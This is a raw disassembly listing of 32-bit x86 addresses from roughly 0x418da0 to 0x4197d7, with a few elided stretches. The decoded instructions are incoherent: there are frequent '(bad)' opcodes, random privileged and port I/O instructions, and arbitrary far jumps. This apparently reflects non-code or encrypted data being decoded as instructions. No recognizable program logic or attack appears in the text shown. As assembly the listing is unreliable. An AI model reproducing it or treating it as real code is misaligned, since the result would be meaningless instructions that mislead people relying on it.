  418da0:	inc    ebx
  418da1:	lds    edx,FWORD PTR [ebp+0x70]
  418da4:	cli    
  418da5:	hlt    
  418da6:	cmc    
  418da7:	dec    edx
  418da8:	enter  0xda21,0x2b
  418dac:	jb     0x418ded
  418dae:	dec    edi
  418daf:	lock add al,0xdc
  418db2:	sahf   
  418db3:	add    al,BYTE PTR [ecx+0x32cdadd9]
  418db9:	xor    DWORD PTR [edi-0x40],edi
  418dbc:	mov    ds:0x2504e150,al
  418dc1:	inc    esp
  418dc2:	jae    0x418e03
  418dc4:	lods   al,BYTE PTR ds:[esi]
  418dc5:	sti    
  418dc6:	xor    esi,ecx
  418dc8:	pop    ss
  418dc9:	dec    ecx
  418dca:	lods   al,BYTE PTR ds:[esi]
  418dcb:	and    DWORD PTR [ebx],ecx
  418dcd:	cmp    al,0xd3
  418dcf:	mov    edi,0x87776adf
  418dd5:	and    ch,BYTE PTR [ebx+0x69]
  418dd8:	inc    edi
  418dd9:	lods   al,BYTE PTR ds:[esi]
  418dda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ddb:	cmp    edx,esi
  418ddd:	lds    edx,FWORD PTR [esi-0x53]
  418de0:	retf   0xd3ec
  418de3:	pop    ebp
  418de4:	mov    eax,0x2cc5fbb6
  418de9:	ins    BYTE PTR es:[edi],dx
  418dea:	in     al,dx
  418deb:	jo     0x418e31
  418ded:	aas    
  418dee:	and    ebx,DWORD PTR [ecx-0x56]
  418df1:	and    BYTE PTR [edx+0x44],0x99
  418df5:	gs (bad) 
  418df7:	mov    esp,0x7f706c61
  418dfc:	jl     0x418dcf
  418dfe:	cmp    DWORD PTR [ecx+0x524253ae],0xdb3e330a
  418e08:	outs   dx,DWORD PTR ds:[esi]
  418e09:	add    edx,DWORD PTR [eax-0x7e1b167e]
  418e0f:	push   edi
  418e10:	xchg   esp,eax
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x5a]
  418e81:	icebp  
  418e82:	cld    
  418e83:	in     ax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0xb6000001
  418e8d:	aad    0x20
  418e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e90:	dec    esi
  418e91:	shl    BYTE PTR [ebx],cl
  418e93:	push   ebx
  418e94:	shr    bh,1
  418e96:	mov    eax,gs
  418e98:	dec    edx
  418e99:	mov    cs,ebx
  418e9b:	xchg   BYTE PTR [ebp-0xd],bh
  418e9e:	mov    ds:0x9b2358d,eax
  418ea3:	fist   WORD PTR [edi]
  418ea5:	mov    ebx,DWORD PTR [ecx]
  418ea7:	jbe    0x418ec4
  418ea9:	ds xor eax,0xfa7b1263
  418eaf:	dec    edi
  418eb0:	aam    0xdf
  418eb2:	jne    0x418f28
  418eb4:	jo     0x418ee2
  418eb6:	ja     0x418ef1
  418eb8:	not    BYTE PTR [esp+ecx*4+0x4e809649]
  418ebf:	inc    ebp
  418ec0:	rcl    ecx,1
  418ec2:	or     bh,0x1a
  418ec5:	frstor [edi]
  418ec7:	mov    bh,0xbf
  418ec9:	adc    BYTE PTR [eax-0x528d3c97],ah
  418ecf:	cmp    esi,ebx
  418ed1:	test   al,0xfd
  418ed3:	shr    DWORD PTR [edx-0x4],0x60
  418ed7:	sub    BYTE PTR [ecx+0xc],0x58
  418edb:	cmp    DWORD PTR [ebp-0x16],edi
  418ede:	jmp    0x9fd1:0xa9e48388
  418ee5:	in     al,dx
  418ee6:	(bad)  
  418ee7:	inc    edi
  418ee8:	out    dx,eax
  418ee9:	ins    BYTE PTR es:[edi],dx
  418eea:	rcl    DWORD PTR [edi-0x71],cl
  418eed:	ins    DWORD PTR es:[edi],dx
  418eee:	sti    
  418eef:	push   ecx
  418ef0:	push   cs
  418ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ef2:	cmp    dh,BYTE PTR [edx]
  418ef4:	std    
  418ef5:	icebp  
  418ef6:	dec    esp
  418ef7:	mov    esi,0xb03ea350
  418efc:	(bad)  
  418efe:	rol    BYTE PTR [ebx],0x72
  418f01:	aam    0x61
  418f03:	nop
  418f04:	repz or al,0x64
  418f07:	int3   
  418f08:	idiv   DWORD PTR [ebp+0x7ecdf23d]
  418f0e:	mov    al,0x41
  418f10:	(bad)  
  418f13:	imul   edi,DWORD PTR [edi],0xfffffff8
  418f16:	hlt    
  418f17:	add    DWORD PTR [ecx+0xa],ebx
  418f1a:	test   cl,ah
  418f1c:	rcl    BYTE PTR [edx],1
  418f1e:	sub    BYTE PTR [eax],ch
  418f20:	addr16 jmp 0x418f5b
  418f23:	cdq    
  418f24:	push   ss
  418f25:	mov    al,0x6d
  418f27:	outs   dx,DWORD PTR ds:[esi]
  418f28:	jmp    0xff5b2d86
  418f2d:	inc    ebx
  418f2e:	adc    ecx,edx
  418f30:	push   edx
  418f31:	sbb    BYTE PTR [edi],dh
  418f33:	clc    
  418f34:	add    al,0x10
  418f36:	ja     0x418edf
  418f38:	outs   dx,DWORD PTR ds:[esi]
  418f39:	push   ebx
  418f3a:	add    DWORD PTR [ecx+0x7f],esi
  418f3d:	pushf  
  418f3e:	pop    esp
  418f3f:	adc    ch,BYTE PTR [ecx+0x49437afd]
  418f45:	in     eax,0xed
  418f47:	repz pop edi
  418f49:	int    0x84
  418f4b:	ss sub edi,edi
  418f4e:	ret    
  418f4f:	jge    0x418f64
  418f51:	jbe    0x418fc9
  418f53:	mov    esp,0xf7081f20
  418f58:	inc    esp
  418f59:	(bad)  
  418f5a:	cmp    esp,edx
  418f5c:	sbb    esi,DWORD PTR [eax-0x4bf40a2d]
  418f62:	sub    edi,DWORD PTR [ecx-0x77]
  418f65:	ds ins DWORD PTR es:[edi],dx
  418f67:	mov    cl,0x9
  418f69:	in     al,dx
  418f6a:	jmp    0x418f28
  418f6c:	cmp    DWORD PTR [eax],esi
  418f6e:	push   esp
  418f6f:	jp     0x418fc7
  418f71:	sbb    ebp,DWORD PTR [ebx-0x279f4f6f]
  418f77:	outs   dx,DWORD PTR ds:[esi]
  418f78:	lock sahf 
  418f7a:	scas   eax,DWORD PTR es:[edi]
  418f7b:	in     eax,0x91
  418f7d:	test   eax,0x5da970a4
  418f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f83:	and    eax,DWORD PTR [esi]
  418f85:	dec    ebp
  418f86:	test   al,0x2b
  418f88:	cmp    eax,0xc54b3bb5
  418f8d:	xchg   ecx,eax
  418f8e:	outs   dx,DWORD PTR ds:[esi]
  418f8f:	dec    eax
  418f90:	push   cs
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x52eaf1a7]
  419001:	shl    BYTE PTR [ebx],1
  419003:	(bad)  
  419004:	jmp    0x1:0x5000108
  41900b:	add    BYTE PTR [edi+ebx*4-0x33287454],bh
  419012:	and    esi,edx
  419014:	lea    ecx,[esi]
  419016:	jnp    0x418fb9
  419018:	in     eax,dx
  419019:	lock outs dx,DWORD PTR ds:[esi]
  41901b:	push   esi
  41901c:	mov    al,ds:0xeaab02db
  419021:	inc    esi
  419022:	leave  
  419023:	xchg   esi,eax
  419024:	ss inc eax
  419026:	xchg   edx,eax
  419027:	inc    ebp
  419028:	jmp    0x103457cc
  41902d:	mov    cl,0x71
  41902f:	pusha  
  419030:	pop    edi
  419031:	lds    eax,FWORD PTR [esi]
  419033:	lea    eax,[ebx+ebx*4+0x19]
  419037:	sbb    cl,BYTE PTR [edx+0x6df6e6c0]
  41903d:	push   edi
  41903e:	jns    0x419052
  419040:	ret    
  419041:	xor    dl,BYTE PTR [ebx]
  419043:	sub    edi,esi
  419045:	sbb    DWORD PTR [ebx-0x372612cb],0x935205b4
  41904f:	mov    ebx,0x9d734bed
  419054:	inc    esp
  419055:	push   esp
  419056:	sti    
  419057:	adc    al,0xc4
  419059:	adc    edi,DWORD PTR [edi]
  41905b:	push   ss
  41905c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41905e:	jp     0x419039
  419060:	retf   
  419061:	arpl   WORD PTR [esi],cx
  419063:	and    eax,0xd4a1fec0
  419068:	fistp  QWORD PTR [esi-0x5e5029a6]
  41906e:	jmp    0xf21d:0xb0171c8c
  419075:	enter  0x7a1e,0xb2
  419079:	jns    0x4190da
  41907b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907c:	sbb    al,0xca
  41907e:	(bad)  
  41907f:	cmp    eax,0x5dfabf2f
  419084:	add    BYTE PTR ds:0xf2144d6e,0x87
  41908b:	adc    al,0xd4
  41908d:	or     ch,ch
  41908f:	div    ch
  419091:	adc    DWORD PTR [esi-0x73bf5718],edx
  419097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419098:	(bad)  [edx]
  41909a:	or     esi,0x4d236298
  4190a0:	inc    ebx
  4190a1:	mov    ds:0x5c1fd624,al
  4190a6:	mov    ah,0xc1
  4190a8:	in     al,0x1
  4190aa:	mov    esi,0x4dee7d6a
  4190af:	aas    
  4190b0:	(bad)
  4190b3:	push   edi
  4190b4:	jns    0x419109
  4190b6:	or     al,0x15
  4190b8:	shl    BYTE PTR [ebx],1
  4190ba:	dec    esi
  4190bb:	out    0xf6,eax
  4190bd:	xchg   ebp,eax
  4190be:	jge    0x419065
  4190c0:	test   eax,0x593ad251
  4190c5:	add    al,0x28
  4190c7:	add    BYTE PTR [edx-0x66],bl
  4190ca:	adc    esi,DWORD PTR [edi+0x3f]
  4190cd:	ja     0x419075
  4190cf:	out    0x7f,al
  4190d1:	xchg   esi,eax
  4190d2:	ja     0x41909f
  4190d4:	jmp    DWORD PTR [edx+0x7397ba70]
  4190da:	cmp    esi,esi
  4190dc:	mov    cs,WORD PTR ds:0xe2b03205
  4190e2:	dec    ebp
  4190e3:	mov    ds:0x962e2b71,eax
  4190e8:	inc    esi
  4190e9:	pop    ecx
  4190ea:	leave  
  4190eb:	loop   0x419104
  4190ed:	adc    ebp,DWORD PTR [ebp-0x2b]
  4190f0:	(bad)  
  4190f2:	js     0x41907d
  4190f4:	lods   eax,DWORD PTR ds:[esi]
  4190f5:	mov    al,0x3c
  4190f7:	mov    esi,0x74390e34
  4190fc:	push   es
  4190fd:	mov    bl,0x47
  4190ff:	jbe    0x41908d
  419101:	inc    edx
  419102:	adc    ebp,DWORD PTR [edx+eax*8+0x49]
  419106:	mov    DWORD PTR [edi+0x1d],esp
  419109:	inc    ebp
  41910a:	xchg   BYTE PTR ds:0x2136eebb,bl
  419110:	xchg   esp,eax
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     bl,BYTE PTR [ebx-0x1077d80b]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x99000001,al
  41918d:	lods   eax,DWORD PTR ds:[esi]
  41918e:	outs   dx,BYTE PTR ds:[esi]
  41918f:	xchg   ecx,eax
  419190:	and    al,0x9c
  419192:	rcl    edi,0x75
  419195:	mov    dh,0xa0
  419197:	cmp    BYTE PTR [edx+0x4a],dl
  41919a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41919b:	push   cs
  41919c:	adc    bh,BYTE PTR [ebp-0x61c7c4b3]
  4191a2:	push   ds
  4191a3:	ror    BYTE PTR [edx],0x38
  4191a6:	lods   eax,DWORD PTR ds:[esi]
  4191a7:	lods   al,BYTE PTR ds:[esi]
  4191a8:	(bad)  
  4191aa:	not    DWORD PTR [edi-0x4d]
  4191ad:	and    al,0x1d
  4191af:	push   0xfffffff7
  4191b1:	mov    ch,0x7c
  4191b3:	push   esi
  4191b4:	dec    ecx
  4191b5:	xchg   ecx,eax
  4191b6:	dec    esp
  4191b7:	jmp    DWORD PTR [edi-0xe4d63ff]
  4191bd:	sub    edi,ecx
  4191bf:	cmp    dh,BYTE PTR [edi]
  4191c1:	mov    ebp,0xccfd435d
  4191c6:	pop    edi
  4191c7:	mov    bh,BYTE PTR [ebp+0x42b5bcbb]
  4191cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ce:	pop    ebp
  4191cf:	sub    eax,0xd91c43b3
  4191d4:	and    DWORD PTR [ebp+0x42],edi
  4191d7:	lds    esp,FWORD PTR [ebx-0x55e5fffb]
  4191dd:	inc    esp
  4191de:	xor    dl,BYTE PTR [eax+ebx*8+0x54]
  4191e2:	sbb    ebp,esi
  4191e4:	mov    BYTE PTR [ebp-0x5186631b],bh
  4191ea:	iret   
  4191eb:	jno    0x41918a
  4191ed:	mov    bh,0xef
  4191ef:	repnz mov eax,0xa1e6b549
  4191f5:	pop    ebp
  4191f6:	lahf   
  4191f7:	sbb    DWORD PTR [ecx+0x10],esi
  4191fa:	mov    ecx,0x8c54ef9c
  4191ff:	cmp    dh,dl
  419201:	es jb  0x4191e5
  419204:	jmp    0x419227
  419206:	mov    ds:0x9f2b6606,eax
  41920b:	in     eax,0xc9
  41920d:	cwde   
  41920e:	clc    
  41920f:	mov    dl,al
  419211:	cmp    BYTE PTR [esi],cl
  419213:	push   ds
  419214:	xchg   esp,eax
  419215:	jp     0x41924f
  419217:	mov    ch,BYTE PTR [eax+ebp*8]
  41921a:	call   0x601c:0xa4cf154e
  419221:	pusha  
  419222:	ins    DWORD PTR es:[edi],dx
  419223:	jmp    0xf768d18b
  419228:	or     DWORD PTR [eax+0x6b99a908],0x53
  41922f:	sbb    ecx,DWORD PTR [ebp+0x57d097ed]
  419235:	js     0x419220
  419237:	cmovge esp,DWORD PTR [eax-0x2a]
  41923b:	and    BYTE PTR [edi+0x743d2ebc],bh
  419241:	xor    eax,0xdd551764
  419246:	jmp    0xa1b0:0xe08c0fd2
  41924d:	mov    ebp,0x7ef76d98
  419252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419253:	data16 jg 0x4192bc
  419256:	popf   
  419257:	lods   eax,DWORD PTR ds:[esi]
  419258:	loop   0x4192d3
  41925a:	mov    fs,WORD PTR [esi+0x76f3dca2]
  419260:	(bad)  
  419261:	mov    al,ds:0x79821a62
  419266:	mov    bl,0x82
  419268:	push   cs
  419269:	mov    al,ds:0xc843e1a4
  41926e:	xor    BYTE PTR [esi+0x1d],ah
  419271:	aas    
  419272:	mov    ds:0xc067d7f1,al
  419277:	out    dx,eax
  419278:	inc    ebx
  41927a:	jbe    0x419264
  41927c:	in     eax,dx
  41927d:	xor    DWORD PTR [edi],ecx
  41927f:	cmp    BYTE PTR [edx+0x49],0xbb
  419283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419284:	sbb    ebp,DWORD PTR ds:0x234df7b8
  41928a:	jl     0x419301
  41928c:	(bad)  [ecx+edi*8]
  41928f:	out    dx,eax
  419290:	out    0x0,eax
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	jns    0x419365
  419302:	jl     0x41932b
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0xc6000001,al
  41930d:	aas    
  41930e:	fstp   TBYTE PTR [ebx+0x5b68d2df]
  419314:	cmp    cl,BYTE PTR [esi-0x1]
  419317:	mov    ds:0x28e5c248,al
  41931c:	fistp  WORD PTR [edx+0x2d]
  41931f:	push   ds
  419320:	fmul   DWORD PTR [ebx-0x1e]
  419323:	jl     0x419383
  419325:	adc    esi,edx
  419327:	pop    es
  419328:	or     DWORD PTR [ebx],ecx
  41932a:	neg    BYTE PTR [esp+edi*2-0x12]
  41932e:	lock mov al,ds:0xf65ddb48
  419334:	rcr    BYTE PTR [edi+esi*4],cl
  419337:	aam    0xba
  419339:	xor    eax,0x678fecc1
  41933e:	mov    ds:0xa45e8cc2,eax
  419343:	in     eax,0xea
  419345:	(bad)  
  419346:	sar    al,cl
  419348:	inc    esp
  419349:	mov    ebp,DWORD PTR [eax+0x3a]
  41934c:	cwde   
  41934d:	push   edi
  41934e:	inc    ecx
  41934f:	pop    es
  419350:	sbb    eax,0x24df8cb5
  419355:	cmp    edx,DWORD PTR es:[edi]
  419358:	jne    0x4192f3
  41935a:	sbb    DWORD PTR [esi],ebp
  41935c:	cmp    BYTE PTR [edi],0xf
  41935f:	inc    ebx
  419360:	pop    ss
  419361:	add    ebp,esp
  419363:	push   ebp
  419364:	ret    0x9211
  419367:	add    DWORD PTR [ebp-0x1c7c6286],0xffffffb8
  41936e:	shl    BYTE PTR [esi-0x28],1
  419371:	test   eax,0x757c059f
  419376:	pop    edx
  419377:	jg     0x419343
  419379:	(bad)  
  41937a:	std    
  41937b:	push   0x73
  41937d:	jb     0x41930f
  41937f:	xor    al,0x3e
  419381:	into   
  419382:	mov    ch,0x5f
  419384:	lods   al,BYTE PTR ds:[esi]
  419385:	out    dx,eax
  419386:	xor    DWORD PTR [esi],esp
  419388:	or     DWORD PTR [ebx-0x24],esi
  41938b:	inc    edi
  41938c:	sub    eax,0x6cd078ff
  419391:	leave  
  419392:	dec    ebx
  419393:	mov    bh,ah
  419395:	shl    BYTE PTR [esi],cl
  419397:	and    esp,DWORD PTR [esi-0x64a8fd7d]
  41939d:	arpl   WORD PTR [ebx],si
  41939f:	ja     0x41934f
  4193a1:	jns    0x4193d0
  4193a3:	test   bh,bh
  4193a5:	fmul   QWORD PTR [edi+ebx*4]
  4193a8:	dec    ebx
  4193a9:	dec    eax
  4193aa:	pop    edi
  4193ab:	xlat   BYTE PTR ds:[ebx]
  4193ac:	jnp    0x4193b2
  4193ae:	pop    eax
  4193af:	jp     0x41936e
  4193b1:	mov    BYTE PTR es:[ecx],ah
  4193b4:	sbb    eax,edi
  4193b6:	push   esp
  4193b7:	jnp    0x41933c
  4193b9:	cmp    DWORD PTR [ecx+0xe3f068f],esp
  4193bf:	pusha  
  4193c0:	out    dx,eax
  4193c1:	mov    WORD PTR [esi],gs
  4193c3:	adc    DWORD PTR [eax+0x234baee2],eax
  4193c9:	pop    es
  4193ca:	and    ecx,DWORD PTR [edx+0x35]
  4193cd:	pop    ds
  4193ce:	call   FWORD PTR [eax+0x14dc2a6]
  4193d4:	or     eax,0x9c3a3345
  4193d9:	iret   
  4193da:	mov    ah,0x9c
  4193dc:	lea    eax,[ebx]
  4193de:	test   dl,0x90
  4193e1:	dec    BYTE PTR [ecx]
  4193e3:	jns    0x4193b5
  4193e5:	push   es
  4193e6:	push   es
  4193e7:	push   0x12da5c92
  4193ec:	dec    ebp
  4193ed:	(bad)  
  4193ee:	aad    0x49
  4193f0:	sar    DWORD PTR [ebx-0x1e6db6d7],1
  4193f6:	cwde   
  4193f7:	mov    dl,0xc1
  4193f9:	sub    al,0xba
  4193fb:	(bad)  
  4193fd:	daa    
  4193fe:	pushf  
  4193ff:	sub    al,0x51
  419401:	in     al,0xfb
  419403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419404:	pop    ss
  419405:	ror    ecx,1
  419407:	jns    0x41943b
  419409:	dec    ebx
  41940a:	cmp    esp,ebp
  41940c:	sbb    eax,0xb861e0f7
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	leave  
  419481:	xor    DWORD PTR [ebx],edx
  419483:	loop   0x41947e
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0xb000001,al
  41948d:	cmp    al,0x59
  41948f:	dec    eax
  419490:	push   eax
  419491:	add    DWORD PTR [edx],edx
  419493:	mov    ebp,edx
  419495:	xchg   bl,bh
  419497:	jp     0x41947b
  419499:	xchg   ebx,eax
  41949a:	jmp    0xdac3:0xc6209f22
  4194a1:	fstp   QWORD PTR [ebp+0x203e3d75]
  4194a7:	add    eax,0x5b1b183f
  4194ac:	(bad)  
  4194ad:	addr16 mov ah,0xb
  4194b0:	bound  esp,QWORD PTR [ebp-0x5af728b0]
  4194b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b7:	add    eax,0x24ffa406
  4194bc:	ja     0x41943f
  4194be:	and    dl,dl
  4194c0:	lea    eax,[ebp-0x36]
  4194c3:	or     BYTE PTR [eax+0x7a],cl
  4194c6:	out    0x8f,al
  4194c8:	jecxz  0x4194b2
  4194ca:	push   esp
  4194cb:	not    BYTE PTR [ecx-0x1eb1532d]
  4194d1:	or     cl,bh
  4194d3:	retf   
  4194d4:	adc    esp,esi
  4194d6:	adc    DWORD PTR [edi-0x21c75444],edi
  4194dc:	xchg   edx,eax
  4194dd:	mov    ebp,0xa7d95dcf
  4194e2:	(bad)  
  4194e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e4:	daa    
  4194e5:	dec    edi
  4194e6:	inc    edx
  4194e7:	mov    edi,0x298c1a6
  4194ec:	mov    WORD PTR [esi-0x709d47ee],es
  4194f2:	mov    al,ds:0x3326f7e0
  4194f7:	(bad)  
  4194f8:	aaa    
  4194f9:	push   0xffffffb9
  4194fb:	clc    
  4194fc:	and    ebp,edi
  4194fe:	and    al,0xcf
  419500:	mov    edx,0xc84d35f
  419505:	xor    DWORD PTR [esi+0x54],eax
  419508:	push   es
  419509:	enter  0x9793,0x8b
  41950d:	sub    BYTE PTR [edi-0x2],0xba
  419511:	dec    ecx
  419512:	iret   
  419513:	lahf   
  419514:	pop    ebp
  419515:	dec    esp
  419516:	pop    eax
  419517:	xchg   esp,eax
  419518:	jl     0x419561
  41951a:	retf   0x5fc7
  41951d:	outs   dx,DWORD PTR ds:[esi]
  41951e:	xchg   ebp,eax
  41951f:	fs cdq 
  419521:	pop    ebp
  419522:	jo     0x41954f
  419524:	or     al,0xea
  419526:	sbb    BYTE PTR [edx-0x55],al
  419529:	sub    eax,0xd73073b9
  41952e:	ins    BYTE PTR es:[edi],dx
  41952f:	daa    
  419530:	mov    esp,es
  419532:	test   DWORD PTR [ebx+0x31],ebp
  419535:	xor    DWORD PTR [ecx+0x13],esp
  419538:	nop
  419539:	les    ebx,FWORD PTR [edx-0x49c757b]
  41953f:	adc    edx,ebp
  419541:	dec    esp
  419542:	pop    ebp
  419543:	mov    ecx,0xaf39835
  419548:	xlat   BYTE PTR ds:[ebx]
  419549:	int    0x27
  41954b:	xchg   ecx,eax
  41954c:	iret   
  41954d:	jb     0x419506
  41954f:	mov    edi,0xe0b2a1a4
  419554:	xchg   ecx,eax
  419555:	(bad)  [esp+ebp*1]
  419558:	cdq    
  419559:	pop    esp
  41955a:	dec    esi
  41955b:	aad    0x6c
  41955d:	push   ebx
  41955e:	pop    edx
  41955f:	imul   ebp,DWORD PTR [eax+0x26],0x7a301e7
  419566:	outs   dx,BYTE PTR ds:[esi]
  419567:	and    ebx,DWORD PTR [ecx-0x52c59982]
  41956d:	leave  
  41956e:	stc    
  41956f:	fisub  WORD PTR [ebp-0x7ad47b6e]
  419575:	cld    
  419576:	inc    ebp
  419577:	lods   eax,DWORD PTR ds:[esi]
  419578:	mov    bh,0x9
  41957a:	icebp  
  41957b:	iret   
  41957c:	(bad)
  41957f:	inc    ebx
  419580:	pop    edx
  419581:	sbb    edi,DWORD PTR [edx]
  419583:	mov    cl,0xd6
  419585:	neg    DWORD PTR ss:0x14e2b33e
  41958c:	addr16 call 0xffc0cd
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	sub    bl,cl
  419602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419603:	xchg   esp,eax
  419604:	dec    BYTE PTR [ecx+eax*1]
  419607:	add    BYTE PTR ds:0x52000001,al
  41960d:	xor    al,BYTE PTR [esi]
  41960f:	mov    ebp,0x73d23f3c
  419614:	rcr    ch,0x3
  419617:	sbb    DWORD PTR [eax+ecx*8-0x7c94bc8b],eax
  41961e:	nop
  41961f:	ins    BYTE PTR es:[edi],dx
  419620:	sub    edi,eax
  419622:	mulps  xmm0,XMMWORD PTR [edi+0x6]
  419626:	push   ebp
  419627:	data16 lock (bad) 
  41962a:	(bad)  
  41962b:	sub    esi,esp
  41962d:	in     eax,0xb1
  41962f:	xor    eax,0x386809bd
  419634:	cmp    al,0xec
  419636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419637:	jle    0x419614
  419639:	loopne 0x4195c3
  41963b:	pusha  
  41963c:	fcom   DWORD PTR [ecx+0x7c90355e]
  419642:	pop    edi
  419643:	aas    
  419644:	int3   
  419645:	jge    0x41966c
  419647:	fst    QWORD PTR [ebx]
  419649:	int3   
  41964a:	cs repz push ecx
  41964d:	cs scas eax,DWORD PTR es:[edi]
  41964f:	jno    0x4196c3
  419651:	loopne 0x419651
  419653:	or     BYTE PTR [ebp+0x4eed52a8],bh
  419659:	mov    al,0x94
  41965b:	push   0xfffffffa
  41965d:	mov    cs:0x214e677e,al
  419663:	(bad)  
  419664:	jmp    0x41962c
  419666:	repz cmp eax,0xb33c40ee
  41966c:	or     eax,0x8b2370fa
  419671:	sti    
  419672:	(bad)  
  419673:	jbe    0x419638
  419675:	or     al,cl
  419677:	and    eax,0xf7fa6c1a
  41967c:	mov    bl,0xca
  41967e:	and    bl,BYTE PTR [esi*8-0x416b74b8]
  419685:	rcl    BYTE PTR [ebx+0x44a425f0],cl
  41968b:	cmc    
  41968c:	xor    eax,0x3320c27c
  419691:	xor    DWORD PTR [ebx],0x50
  419694:	lock and esi,DWORD PTR [eax]
  419697:	cdq    
  419698:	inc    edx
  419699:	clc    
  41969a:	das    
  41969b:	call   DWORD PTR [eax+ecx*8+0x2b]
  41969f:	jp     0x419712
  4196a1:	mov    ebp,0x9783d6a1
  4196a6:	adc    eax,0xb0726883
  4196ab:	push   ebp
  4196ac:	stc    
  4196ad:	out    0x9,eax
  4196af:	dec    esi
  4196b0:	mov    ebx,0x86a74118
  4196b5:	sub    bh,BYTE PTR [ebp-0x5b7acdfd]
  4196bb:	jns    0x419653
  4196bd:	sub    DWORD PTR [ecx],ebx
  4196bf:	xor    BYTE PTR [eax],0xa0
  4196c2:	xchg   ecx,ebp
  4196c4:	cli    
  4196c5:	sub    edx,DWORD PTR [esi-0x2d618ace]
  4196cb:	fwait
  4196cc:	or     al,0xaf
  4196ce:	or     DWORD PTR [esi],ecx
  4196d0:	inc    ebx
  4196d1:	mov    dl,BYTE PTR [eax-0x32f0e902]
  4196d7:	add    DWORD PTR [esi],ebx
  4196d9:	mov    ch,0x1f
  4196db:	fld    TBYTE PTR [ecx+0x42]
  4196de:	add    al,0x86
  4196e0:	mov    al,BYTE PTR [ebx-0x14d6b1ac]
  4196e6:	sbb    esi,esp
  4196e8:	mov    ds:0x219d39bd,eax
  4196ed:	sub    eax,0x5a039cd8
  4196f2:	jno    0x4196bd
  4196f4:	dec    ebx
  4196f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196f6:	add    BYTE PTR [ebp-0xe],ah
  4196f9:	daa    
  4196fa:	dec    edi
  4196fb:	or     al,0xb1
  4196fd:	ret    0xb95e
  419700:	xor    DWORD PTR [ebx-0x5a10f917],edi
  419706:	mov    eax,ds:0x59b8debf
  41970b:	mov    bl,0x25
  41970d:	inc    edi
  41970e:	cli    
  41970f:	iret   
  419710:	push   ecx
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x328dd0ae
  419781:	pop    ebx
  419782:	cmp    bh,dh
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0xb6000001
  41978d:	or     al,0xb4
  41978f:	push   ss
  419790:	cli    
  419791:	cmp    DWORD PTR [edx+eiz*8-0x3c752056],ebx
  419798:	imul   edi,DWORD PTR [eax],0xffffff88
  41979b:	fcom   QWORD PTR [ebx]
  41979d:	pop    edx
  41979e:	mov    esi,edx
  4197a0:	cmp    ebx,DWORD PTR [ebx]
  4197a2:	retf   0x90bc
  4197a5:	int    0xca
  4197a7:	fild   QWORD PTR [esi]
  4197a9:	dec    ecx
  4197aa:	add    edx,DWORD PTR [ebx]
  4197ac:	cdq    
  4197ad:	cdq    
  4197ae:	add    ch,BYTE PTR [ebx+0x34]
  4197b1:	ja     0x4197ef
  4197b3:	or     al,0x15
  4197b5:	into   
  4197b6:	lods   eax,DWORD PTR ds:[esi]
  4197b7:	mov    ch,dl
  4197b9:	mov    al,ds:0xdebad566
  4197be:	out    0xa3,al
  4197c0:	sahf   
  4197c1:	dec    ebp
  4197c2:	sbb    eax,DWORD PTR [ebx+ebp*4-0x51]
  4197c6:	inc    eax
  4197c7:	fs pushf 
  4197c9:	push   ecx
  4197ca:	sbb    al,0x30
  4197cc:	out    0xff,eax
  4197ce:	xchg   BYTE PTR [edx-0x4b],dh
  4197d1:	pusha  
  4197d2:	mov    ds:0x3c9130d5,al
  4197d7:	push   ecx
